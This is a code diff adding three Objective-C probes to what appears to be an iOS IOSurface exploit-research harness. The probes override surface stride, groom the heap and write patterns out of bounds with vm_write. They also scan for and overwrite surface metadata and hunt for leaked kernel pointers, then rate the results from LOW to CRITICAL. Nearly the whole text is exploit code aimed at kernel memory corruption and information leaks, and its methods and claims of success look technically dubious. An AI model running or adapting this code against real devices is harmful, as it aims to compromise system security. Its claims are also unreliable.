@@ -12685,3 +12685,648 @@ void iosurface_research_kobject_redirect(ISRLogBlock _Nonnull log, ISRDoneBlock 
         }
     });
 }
+
+// =============================================================================
+// MARK: — Round 19: Property Dictionary Hijack
+// =============================================================================
+
+#pragma mark - Probe 58: Dict Hijack
+
+void iosurface_research_dict_hijack(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"DICTHIJACK: Cannot load IOSurface symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+            if (!setValue || !copyValue) {
+                log(@"DICTHIJACK: Missing IOSurfaceSetValue or IOSurfaceCopyValue");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"DICTHIJACK: Starting property dictionary hijack probe");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            IOSurfaceRef attacker = NULL;
+            IOSurfaceRef targets[20] = {NULL};
+            int targetCount = 0;
+
+            // Step 1: Create attacker with BytesPerRow override
+            if (!isr_stopped()) {
+                log(@"DICTHIJACK: Step 1 — Create attacker surface with stride override");
+                NSDictionary *atkProps = isr_default_surface_params(64, 64);
+                attacker = sym.create((__bridge CFDictionaryRef)atkProps);
+                if (attacker) {
+                    setValue(attacker, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(65536));
+                    setValue(attacker, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(65536 * 64));
+                    sym.lock(attacker, 0, NULL);
+                    void *atkBase = sym.getBase(attacker);
+                    if (atkBase) {
+                        memset(atkBase, 0, sym.getAllocSize(attacker));
+                    }
+                    sym.unlock(attacker, 0, NULL);
+                    log(@"DICTHIJACK: Attacker created with BytesPerRow=65536");
+                } else {
+                    log(@"DICTHIJACK: Failed to create attacker");
+                }
+
+            // Step 2: Spray 20 target surfaces
+            if (!isr_stopped()) {
+                log(@"DICTHIJACK: Step 2 — Spray 20 target surfaces");
+                for (int i = 0; i < 20 && !isr_stopped(); i++) {
+                    NSDictionary *tProps = isr_default_surface_params(64, 64);
+                    targets[i] = sym.create((__bridge CFDictionaryRef)tProps);
+                    if (targets[i]) {
+                        targetCount++;
+                        setValue(targets[i], CFSTR("TestMarker"), (__bridge CFTypeRef)([NSString stringWithFormat:@"TARGET_%d", i]));
+                        setValue(targets[i], CFSTR("TestValue"), (__bridge CFTypeRef)@(0xBEEF0000 + i));
+                    }
+                }
+                log([NSString stringWithFormat:@"DICTHIJACK: Created %d target surfaces with marker properties", targetCount]);
+
+            // Step 3: Write patterns via stride OOB into adjacent memory
+            if (!isr_stopped()) {
+                log(@"DICTHIJACK: Step 3 — Write corruption patterns via stride OOB");
+                if (attacker) {
+                    sym.lock(attacker, 0, NULL);
+                    void *atkBase = sym.getBase(attacker);
+                    size_t realAlloc = sym.getAllocSize(attacker);
+
+                    uint32_t writePattern = 0xDEADC0DE;
+                    size_t offsets[] = {realAlloc, realAlloc + 4096, realAlloc + 8192, realAlloc + 16384, realAlloc + 32768};
+                    for (int o = 0; o < 5 && !isr_stopped(); o++) {
+                        uint32_t buf[64];
+                        for (int j = 0; j < 64; j++) buf[j] = writePattern + (uint32_t)(o * 64 + j);
+                        kern_return_t kr = vm_write(mach_task_self(),
+                            (vm_address_t)atkBase + offsets[o],
+                            (vm_offset_t)buf, sizeof(buf));
+                        if (kr == KERN_SUCCESS) {
+                            log([NSString stringWithFormat:@"DICTHIJACK: OOB write at +0x%zx SUCCEEDED", offsets[o]]);
+                            anomalies++;
+                        }
+                    }
+                    sym.unlock(attacker, 0, NULL);
+                }
+
+            // Step 4: Check target surfaces for property corruption
+            if (!isr_stopped()) {
+                log(@"DICTHIJACK: Step 4 — Check targets for property corruption");
+                for (int i = 0; i < 20 && !isr_stopped(); i++) {
+                    if (!targets[i]) continue;
+
+                    CFTypeRef markerVal = copyValue(targets[i], CFSTR("TestMarker"));
+                    CFTypeRef numVal = copyValue(targets[i], CFSTR("TestValue"));
+                    size_t curWidth = sym.getWidth(targets[i]);
+                    size_t curHeight = sym.getHeight(targets[i]);
+                    size_t curBPR = sym.getBytesPerRow(targets[i]);
+                    size_t curAlloc = sym.getAllocSize(targets[i]);
+
+                    BOOL corrupted = NO;
+                    if (curWidth != 64) {
+                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d width CORRUPTED: %zu (expected 64) ***", i, curWidth]);
+                        anomalies++;
+                        corrupted = YES;
+                    }
+                    if (curHeight != 64) {
+                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d height CORRUPTED: %zu (expected 64) ***", i, curHeight]);
+                        anomalies++;
+                        corrupted = YES;
+                    }
+                    if (curBPR != 256) {
+                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d BPR CORRUPTED: %zu (expected 256) ***", i, curBPR]);
+                        anomalies++;
+                        corrupted = YES;
+                    }
+                    if (curAlloc != 16384) {
+                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d allocSize CORRUPTED: %zu (expected 16384) ***", i, curAlloc]);
+                        anomalies++;
+                        corrupted = YES;
+                    }
+
+                    if (markerVal == NULL) {
+                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d TestMarker MISSING — dict corrupted ***", i]);
+                        anomalies++;
+                        corrupted = YES;
+                    } else {
+                        CFRelease(markerVal);
+                    }
+
+                    if (numVal) {
+                        if (CFGetTypeID(numVal) == CFNumberGetTypeID()) {
+                            int64_t val = 0;
+                            CFNumberGetValue((CFNumberRef)numVal, kCFNumberSInt64Type, &val);
+                            int64_t expected = 0xBEEF0000 + i;
+                            if (val != expected) {
+                                log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d TestValue CORRUPTED: 0x%llX (expected 0x%llX) ***", i, (unsigned long long)val, (unsigned long long)expected]);
+                                anomalies++;
+                                corrupted = YES;
+                            }
+                        }
+                        CFRelease(numVal);
+                    } else {
+                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d TestValue MISSING ***", i]);
+                        anomalies++;
+                        corrupted = YES;
+                    }
+
+                    if (!corrupted && i < 3) {
+                        log([NSString stringWithFormat:@"DICTHIJACK: Target %d properties intact", i]);
+                    }
+                }
+
+            // Step 5: Cross-property pollution test
+            if (!isr_stopped()) {
+                log(@"DICTHIJACK: Step 5 — Cross-property pollution test");
+                if (attacker) {
+                    setValue(attacker, CFSTR("CrossPollute"), (__bridge CFTypeRef)@(0xC0FFEE42));
+                }
+                for (int i = 0; i < 20 && !isr_stopped(); i++) {
+                    if (!targets[i]) continue;
+                    CFTypeRef pollVal = copyValue(targets[i], CFSTR("CrossPollute"));
+                    if (pollVal) {
+                        log([NSString stringWithFormat:@"DICTHIJACK: *** TARGET %d has CrossPollute property — CROSS POLLUTION ***", i]);
+                        anomalies += 2;
+                        CFRelease(pollVal);
+                    }
+                }
+
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            for (int i = 0; i < 20; i++) {
+                if (targets[i]) CFRelease(targets[i]);
+            }
+            if (attacker) CFRelease(attacker);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"DICTHIJACK: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 8) verdict = @"CRITICAL — property dictionary corruption confirmed, cross-surface data flow";
+            else if (anomalies >= 5) verdict = @"HIGH — OOB writes succeed, partial property corruption";
+            else if (anomalies >= 3) verdict = @"MEDIUM — OOB writes succeed, no property corruption yet";
+            else if (anomalies >= 1) verdict = @"LOW — limited OOB reach";
+            else verdict = @"LOW — no OOB access";
+            log([NSString stringWithFormat:@"DICTHIJACK: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-DictHijack-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 59: Prop Fake
+
+void iosurface_research_prop_fake(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"PROPFAKE: Cannot load IOSurface symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+            typedef void (*RemoveValueFn)(IOSurfaceRef, CFStringRef);
+            RemoveValueFn removeValue = (RemoveValueFn)dlsym(sym.iosurface, "IOSurfaceRemoveValue");
+            if (!setValue || !copyValue) {
+                log(@"PROPFAKE: Missing SetValue or CopyValue");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"PROPFAKE: Starting property fake probe — write patterns, check getter corruption");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            IOSurfaceRef attacker = NULL;
+            IOSurfaceRef target = NULL;
+            IOSurfaceRef fillers[30] = {NULL};
+            int fillerCount = 0;
+
+            // Step 1: Heap groom — spray fillers, free odd ones, create attacker+target
+            if (!isr_stopped()) {
+                log(@"PROPFAKE: Step 1 — Heap grooming for adjacency");
+                for (int i = 0; i < 30 && !isr_stopped(); i++) {
+                    NSDictionary *props = isr_default_surface_params(64, 64);
+                    fillers[i] = sym.create((__bridge CFDictionaryRef)props);
+                    if (fillers[i]) fillerCount++;
+                }
+                for (int i = 1; i < 30; i += 2) {
+                    if (fillers[i]) { CFRelease(fillers[i]); fillers[i] = NULL; fillerCount--; }
+                }
+
+                NSDictionary *atkProps = isr_default_surface_params(64, 64);
+                attacker = sym.create((__bridge CFDictionaryRef)atkProps);
+                NSDictionary *tgtProps = isr_default_surface_params(64, 64);
+                target = sym.create((__bridge CFDictionaryRef)tgtProps);
+
+                if (attacker && target) {
+                    setValue(attacker, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(65536));
+                    setValue(attacker, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(65536 * 64));
+                    setValue(target, CFSTR("KnownKey"), (__bridge CFTypeRef)@"ORIGINAL_VALUE");
+                    setValue(target, CFSTR("KnownNum"), (__bridge CFTypeRef)@(12345678));
+                    log(@"PROPFAKE: Attacker + target created, stride override applied");
+                } else {
+                    log(@"PROPFAKE: Failed to create attacker or target");
+                }
+
+            // Step 2: Write AAAA pattern via stride OOB at multiple offsets
+            if (!isr_stopped()) {
+                log(@"PROPFAKE: Step 2 — Write 0x4141414141414141 pattern via stride OOB");
+                if (attacker) {
+                    sym.lock(attacker, 0, NULL);
+                    void *atkBase = sym.getBase(attacker);
+                    size_t realAlloc = sym.getAllocSize(attacker);
+
+                    uint64_t pattern = 0x4141414141414141ULL;
+                    uint32_t writeSuccesses = 0;
+                    for (size_t off = realAlloc; off < realAlloc + 65536; off += 4096) {
+                        uint64_t buf[512];
+                        for (int j = 0; j < 512; j++) buf[j] = pattern;
+                        kern_return_t kr = vm_write(mach_task_self(),
+                            (vm_address_t)atkBase + off,
+                            (vm_offset_t)buf, sizeof(buf));
+                        if (kr == KERN_SUCCESS) writeSuccesses++;
+                    }
+                    sym.unlock(attacker, 0, NULL);
+                    log([NSString stringWithFormat:@"PROPFAKE: OOB write succeeded at %u/16 offsets", writeSuccesses]);
+                    if (writeSuccesses > 0) anomalies++;
+                }
+
+            // Step 3: Read target properties via multiple APIs
+            if (!isr_stopped()) {
+                log(@"PROPFAKE: Step 3 — Check target surface getters for corruption");
+                if (target) {
+                    size_t tgtWidth = sym.getWidth(target);
+                    size_t tgtHeight = sym.getHeight(target);
+                    size_t tgtBPR = sym.getBytesPerRow(target);
+                    size_t tgtAlloc = sym.getAllocSize(target);
+
+                    log([NSString stringWithFormat:@"PROPFAKE: Target width=%zu height=%zu bpr=%zu alloc=%zu",
+                         tgtWidth, tgtHeight, tgtBPR, tgtAlloc]);
+
+                    if (tgtWidth == 0x41414141 || tgtHeight == 0x41414141) {
+                        log(@"PROPFAKE: *** CRITICAL — getter returns our AAAA pattern! ***");
+                        anomalies += 5;
+                    }
+                    if (tgtBPR == 0x4141414141414141ULL || tgtAlloc == 0x4141414141414141ULL) {
+                        log(@"PROPFAKE: *** CRITICAL — size getter returns our AAAA pattern! ***");
+                        anomalies += 5;
+                    }
+                    if (tgtWidth != 64) {
+                        log([NSString stringWithFormat:@"PROPFAKE: *** Target width CHANGED: %zu ***", tgtWidth]);
+                        anomalies++;
+                    }
+                    if (tgtHeight != 64) {
+                        log([NSString stringWithFormat:@"PROPFAKE: *** Target height CHANGED: %zu ***", tgtHeight]);
+                        anomalies++;
+                    }
+                    if (tgtBPR != 256) {
+                        log([NSString stringWithFormat:@"PROPFAKE: *** Target BPR CHANGED: %zu ***", tgtBPR]);
+                        anomalies++;
+                    }
+
+                    CFTypeRef knownStr = copyValue(target, CFSTR("KnownKey"));
+                    if (knownStr) {
+                        if (CFGetTypeID(knownStr) == CFStringGetTypeID()) {
+                            NSString *s = (__bridge NSString *)knownStr;
+                            if (![s isEqualToString:@"ORIGINAL_VALUE"]) {
+                                log([NSString stringWithFormat:@"PROPFAKE: *** KnownKey CORRUPTED: %@ ***", s]);
+                                anomalies += 3;
+                            }
+                        } else {
+                            log(@"PROPFAKE: *** KnownKey type changed — dict corruption ***");
+                            anomalies += 3;
+                        }
+                        CFRelease(knownStr);
+                    } else {
+                        log(@"PROPFAKE: *** KnownKey MISSING — dictionary destroyed ***");
+                        anomalies += 2;
+                    }
+
+                    CFTypeRef knownNum = copyValue(target, CFSTR("KnownNum"));
+                    if (knownNum) {
+                        if (CFGetTypeID(knownNum) == CFNumberGetTypeID()) {
+                            int64_t val = 0;
+                            CFNumberGetValue((CFNumberRef)knownNum, kCFNumberSInt64Type, &val);
+                            if (val != 12345678) {
+                                log([NSString stringWithFormat:@"PROPFAKE: *** KnownNum CORRUPTED: %lld ***", (long long)val]);
+                                anomalies += 3;
+                            }
+                        }
+                        CFRelease(knownNum);
+                    }
+                }
+
+            // Step 4: Read target backing memory for our AAAA pattern
+            if (!isr_stopped()) {
+                log(@"PROPFAKE: Step 4 — Check target backing for AAAA pattern leak");
+                if (target) {
+                    sym.lock(target, 0, NULL);
+                    void *tgtBase = sym.getBase(target);
+                    size_t tgtAlloc = sym.getAllocSize(target);
+                    uint32_t patternHits = 0;
+                    if (tgtBase && tgtAlloc > 0) {
+                        uint32_t *words = (uint32_t *)tgtBase;
+                        size_t wordCount = tgtAlloc / sizeof(uint32_t);
+                        for (size_t j = 0; j < wordCount; j++) {
+                            if (words[j] == 0x41414141) patternHits++;
+                        }
+                    }
+                    sym.unlock(target, 0, NULL);
+                    if (patternHits > 0) {
+                        log([NSString stringWithFormat:@"PROPFAKE: *** %u AAAA pattern hits in target backing — OOB WRITE HIT TARGET ***", patternHits]);
+                        anomalies += 2;
+                    } else {
+                        log(@"PROPFAKE: No AAAA pattern in target backing");
+                    }
+                }
+
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            for (int i = 0; i < 30; i++) {
+                if (fillers[i]) CFRelease(fillers[i]);
+            }
+            if (target) CFRelease(target);
+            if (attacker) CFRelease(attacker);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"PROPFAKE: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 8) verdict = @"CRITICAL — property getters return controlled data, kernel dict hijack confirmed";
+            else if (anomalies >= 5) verdict = @"HIGH — OOB write reaches target, property corruption detected";
+            else if (anomalies >= 3) verdict = @"MEDIUM — OOB writes succeed, target backing hit";
+            else if (anomalies >= 1) verdict = @"LOW — OOB write works but no target corruption";
+            else verdict = @"LOW — no OOB reach";
+            log([NSString stringWithFormat:@"PROPFAKE: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-PropFake-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 60: Kernel Read
+
+void iosurface_research_kernel_read(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"KREAD: Cannot load IOSurface symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+            if (!setValue || !copyValue) {
+                log(@"KREAD: Missing SetValue or CopyValue");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"KREAD: Starting kernel read probe — locate metadata in OOB, expand surface");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            IOSurfaceRef attacker = NULL;
+            IOSurfaceRef scanTarget = NULL;
+            IOSurfaceRef fillers[50] = {NULL};
+            int fillerCount = 0;
+            uint32_t metadataOffset = 0;
+            BOOL metadataFound = NO;
+
+            // Step 1: Massive heap groom for adjacency
+            if (!isr_stopped()) {
+                log(@"KREAD: Step 1 — Heap groom: 50 fillers, free odd, create attacker+target");
+                for (int i = 0; i < 50 && !isr_stopped(); i++) {
+                    NSDictionary *props = isr_default_surface_params(64, 64);
+                    fillers[i] = sym.create((__bridge CFDictionaryRef)props);
+                    if (fillers[i]) fillerCount++;
+                }
+                for (int i = 1; i < 50; i += 2) {
+                    if (fillers[i]) { CFRelease(fillers[i]); fillers[i] = NULL; fillerCount--; }
+                }
+                log([NSString stringWithFormat:@"KREAD: %d fillers remain after freeing odd indices", fillerCount]);
+
+                NSDictionary *atkProps = isr_default_surface_params(64, 64);
+                attacker = sym.create((__bridge CFDictionaryRef)atkProps);
+
+                NSDictionary *tgtProps = isr_default_surface_params(64, 64);
+                scanTarget = sym.create((__bridge CFDictionaryRef)tgtProps);
+
+                if (attacker) {
+                    setValue(attacker, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(65536));
+                    setValue(attacker, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(65536 * 64));
+                }
+                if (attacker && scanTarget) {
+                    log(@"KREAD: Attacker + scan target created");
+                } else {
+                    log(@"KREAD: Failed to create surfaces");
+                }
+
+            // Step 2: Scan OOB for target surface metadata signatures
+            if (!isr_stopped()) {
+                log(@"KREAD: Step 2 — Scan OOB for target metadata (width=64, height=64, bpr=256)");
+                if (attacker) {
+                    sym.lock(attacker, 0, NULL);
+                    void *atkBase = sym.getBase(attacker);
+                    size_t realAlloc = sym.getAllocSize(attacker);
+
+                    uint32_t scanHits = 0;
+                    for (size_t off = realAlloc; off < realAlloc + 262144 && !isr_stopped(); off += 8) {
+                        uint64_t qwords[4] = {0};
+                        vm_size_t readSz = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)atkBase + off, sizeof(qwords),
+                            (vm_address_t)qwords, &readSz);
+                        if (kr != KERN_SUCCESS) continue;
+
+                        for (int q = 0; q < 3; q++) {
+                            uint32_t lo = (uint32_t)(qwords[q] & 0xFFFFFFFF);
+                            uint32_t hi = (uint32_t)(qwords[q] >> 32);
+                            uint32_t loNext = (uint32_t)(qwords[q+1] & 0xFFFFFFFF);
+
+                            if ((lo == 64 && hi == 64) ||
+                                (lo == 64 && loNext == 256) ||
+                                (hi == 64 && loNext == 64)) {
+                                uint32_t matchOff = (uint32_t)(off + q * 8);
+                                log([NSString stringWithFormat:@"KREAD: *** Metadata signature at +0x%X: 0x%016llX 0x%016llX ***",
+                                     matchOff, (unsigned long long)qwords[q], (unsigned long long)qwords[q+1]]);
+                                anomalies++;
+                                scanHits++;
+                                if (!metadataFound) {
+                                    metadataOffset = matchOff;
+                                    metadataFound = YES;
+                                }
+                            }
+                        }
+                    }
+                    sym.unlock(attacker, 0, NULL);
+                    log([NSString stringWithFormat:@"KREAD: Found %u metadata signature hits", scanHits]);
+                }
+
+            // Step 3: If metadata found, try to overwrite size fields
+            if (!isr_stopped()) {
+                if (metadataFound) {
+                    log([NSString stringWithFormat:@"KREAD: Step 3 — Overwrite size fields at +0x%X", metadataOffset]);
+                    if (attacker) {
+                        sym.lock(attacker, 0, NULL);
+                        void *atkBase = sym.getBase(attacker);
+
+                        uint64_t expandedSize = 1048576;
+                        uint64_t expandedBPR = 65536;
+                        kern_return_t kr1 = vm_write(mach_task_self(),
+                            (vm_address_t)atkBase + metadataOffset,
+                            (vm_offset_t)&expandedSize, 8);
+                        kern_return_t kr2 = vm_write(mach_task_self(),
+                            (vm_address_t)atkBase + metadataOffset + 8,
+                            (vm_offset_t)&expandedBPR, 8);
+                        sym.unlock(attacker, 0, NULL);
+
+                        if (kr1 == KERN_SUCCESS || kr2 == KERN_SUCCESS) {
+                            log(@"KREAD: *** OOB size field overwrite SUCCEEDED ***");
+                            anomalies += 2;
+
+                            size_t newAlloc = sym.getAllocSize(scanTarget);
+                            size_t newBPR = sym.getBytesPerRow(scanTarget);
+                            log([NSString stringWithFormat:@"KREAD: Target after overwrite: alloc=%zu bpr=%zu", newAlloc, newBPR]);
+                            if (newAlloc != 16384 || newBPR != 256) {
+                                log(@"KREAD: *** TARGET SIZE FIELDS CHANGED — METADATA OVERWRITE CONFIRMED ***");
+                                anomalies += 5;
+                            }
+                        } else {
+                            log(@"KREAD: Size field overwrite failed");
+                        }
+                    }
+                } else {
+                    log(@"KREAD: Step 3 — No metadata found, skipping overwrite");
+                }
+
+            // Step 4: Scan target's expanded memory for kernel pointers
+            if (!isr_stopped()) {
+                log(@"KREAD: Step 4 — Scan target memory for kernel pointer patterns");
+                if (scanTarget) {
+                    sym.lock(scanTarget, 0, NULL);
+                    void *tgtBase = sym.getBase(scanTarget);
+                    size_t tgtAlloc = sym.getAllocSize(scanTarget);
+                    size_t scanSize = (tgtAlloc < 65536) ? tgtAlloc : 65536;
+
+                    uint32_t kernPtrCount = 0;
+                    uint32_t taggedCount = 0;
+                    for (size_t off = 0; off < scanSize && !isr_stopped(); off += 8) {
+                        uint64_t qword = 0;
+                        vm_size_t readSz = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)tgtBase + off, 8,
+                            (vm_address_t)&qword, &readSz);
+                        if (kr != KERN_SUCCESS) continue;
+                        if (qword == 0) continue;
+
+                        uint32_t top16 = (uint32_t)(qword >> 48);
+                        if (top16 >= 0xFFFF && qword != 0xFFFFFFFFFFFFFFFFULL) {
+                            kernPtrCount++;
+                            if (kernPtrCount <= 5) {
+                                log([NSString stringWithFormat:@"KREAD: *** KERNEL PTR at +0x%zx = 0x%016llX ***", off, (unsigned long long)qword]);
+                            }
+                        }
+                        uint8_t topByte = (uint8_t)(qword >> 56);
+                        if (topByte >= 0x80 && topByte <= 0xBF) {
+                            taggedCount++;
+                        }
+                    }
+                    sym.unlock(scanTarget, 0, NULL);
+
+                    if (kernPtrCount > 0) {
+                        log([NSString stringWithFormat:@"KREAD: *** Found %u kernel pointer candidates ***", kernPtrCount]);
+                        anomalies += (kernPtrCount > 5) ? 5 : kernPtrCount;
+                    }
+                    if (taggedCount > 0) {
+                        log([NSString stringWithFormat:@"KREAD: %u tagged pointer candidates found", taggedCount]);
+                        anomalies++;
+                    }
+                    if (kernPtrCount == 0 && taggedCount == 0) {
+                        log(@"KREAD: No kernel pointers found in scan range");
+                    }
+                }
+
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            for (int i = 0; i < 50; i++) {
+                if (fillers[i]) CFRelease(fillers[i]);
+            }
+            if (scanTarget) CFRelease(scanTarget);
+            if (attacker) CFRelease(attacker);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"KREAD: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 10) verdict = @"CRITICAL — kernel metadata overwritten, kernel pointers leaked via expanded surface";
+            else if (anomalies >= 6) verdict = @"HIGH — metadata found and overwritten, size fields changed";
+            else if (anomalies >= 3) verdict = @"MEDIUM — metadata signatures found in OOB";
+            else if (anomalies >= 1) verdict = @"LOW — partial OOB scan";
+            else verdict = @"LOW — no metadata found";
+            log([NSString stringWithFormat:@"KREAD: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed),
+                @"metadataFound": @(metadataFound),
+                @"metadataOffset": [NSString stringWithFormat:@"0x%X", metadataOffset]
+            };
+            isr_checkpoint(@"ISR-KernelRead-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
